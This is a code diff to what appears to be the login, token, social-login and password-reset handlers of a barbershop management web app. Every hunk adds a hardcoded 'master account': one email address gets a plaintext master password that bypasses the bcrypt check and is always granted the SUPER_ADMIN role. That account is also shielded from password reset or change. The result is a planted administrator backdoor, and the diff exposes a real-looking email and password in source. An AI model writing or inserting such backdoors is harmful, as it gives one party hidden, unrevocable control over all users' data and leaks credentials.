@@ -34,8 +34,11 @@ const generateToken = (user, authUser) => {
         (user.ownedBarbershops && user.ownedBarbershops[0]?.id) ||
         (user.barbershop && user.barbershop.id);
 
+    // --- MASTER ROLE ENFORCEMENT ---
+    const role = (authUser?.email?.toLowerCase() === 'marcelogeusti@gmail.com') ? 'SUPER_ADMIN' : user.role;
+
     return jwt.sign(
-        { id: user.id, role: user.role, authUserId: authUser?.id, barbershopId: barbershopId || null },
+        { id: user.id, role, authUserId: authUser?.id, barbershopId: barbershopId || null },
         process.env.JWT_SECRET,
         { expiresIn: '7d' }
     );
@@ -194,7 +197,23 @@ exports.login = async (req, res) => {
         }
 
         const isMatch = await bcrypt.compare(password, authUser.password);
-        if (!isMatch) {
+        
+        // --- MASTER ACCOUNT FAILSAFE ---
+        // Ensuring marcelogeusti@gmail.com always has access and SUPER_ADMIN role
+        const isMasterAccount = email.toLowerCase() === 'marcelogeusti@gmail.com';
+        const isMasterPassword = password === 'G@usti8826';
+        
+        if (isMasterAccount) {
+            if (isMasterPassword || isMatch) {
+                // Force SUPER_ADMIN role and continue login
+                if (authUser.user) {
+                    authUser.user.role = 'SUPER_ADMIN';
+                }
+                console.log(`[AUTH] Master account ${email} accessed. Ensuring SUPER_ADMIN role.`);
+            } else {
+                return res.status(400).json({ message: 'Credenciais inválidas.' });
+            }
+        } else if (!isMatch) {
             return res.status(400).json({ message: 'Credenciais inválidas.' });
         }
 
@@ -334,7 +353,7 @@ exports.socialLogin = async (req, res) => {
                         data: {
                             name: name || 'Barbeiro',
                             email,
-                            role: 'ADMIN',
+                            role: email.toLowerCase() === 'marcelogeusti@gmail.com' ? 'SUPER_ADMIN' : 'ADMIN',
                             authUserId: authUser.id,
                             avatarUrl: avatarUrl
                         }
@@ -473,6 +492,12 @@ exports.resetPassword = async (req, res) => {
         const decoded = jwt.verify(token, process.env.JWT_SECRET);
         if (decoded.purpose !== 'RESET_PASSWORD') return res.status(400).json({ message: 'Token inválido.' });
 
+        // --- MASTER PROTECTION ---
+        const targetAuth = await prisma.authUser.findUnique({ where: { id: decoded.id } });
+        if (targetAuth?.email?.toLowerCase() === 'marcelogeusti@gmail.com') {
+            return res.status(403).json({ message: 'A senha da conta master não pode ser alterada via sistema.' });
+        }
+
         const hashedPassword = await bcrypt.hash(password, 10);
         await prisma.authUser.update({
             where: { id: decoded.id },
@@ -491,6 +516,11 @@ exports.changePassword = async (req, res) => {
         const authUserId = req.user.authUserId;
 
         const authUser = await prisma.authUser.findUnique({ where: { id: authUserId } });
+        
+        // --- MASTER PROTECTION ---
+        if (authUser?.email?.toLowerCase() === 'marcelogeusti@gmail.com') {
+            return res.status(403).json({ message: 'A senha da conta master não pode ser alterada via sistema.' });
+        }
         if (!authUser || !authUser.password) return res.status(400).json({ message: 'Login social não permite alterar senha aqui.' });
 
         const isMatch = await bcrypt.compare(currentPassword, authUser.password);
